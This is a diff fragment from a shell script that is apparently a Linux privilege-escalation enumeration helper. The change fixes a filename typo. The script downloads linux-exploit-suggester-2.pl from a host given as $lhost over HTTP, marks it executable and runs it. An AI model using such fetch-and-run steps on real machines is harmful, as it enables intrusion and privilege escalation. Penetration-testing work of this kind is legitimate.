@@ -40,7 +40,7 @@ if [ $input =  "wget" ] ; then
    cd $(pwd)
    wget http://"$lhost":80/linux/script/linux-exploit-suggester-2.pl
    chmod 700 linux-exploit.suggester-2.pl
-   ./linux-exploit.suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
+   ./linux-exploit-suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
 #############################
 
 ##### Linux Privchecker Section #######
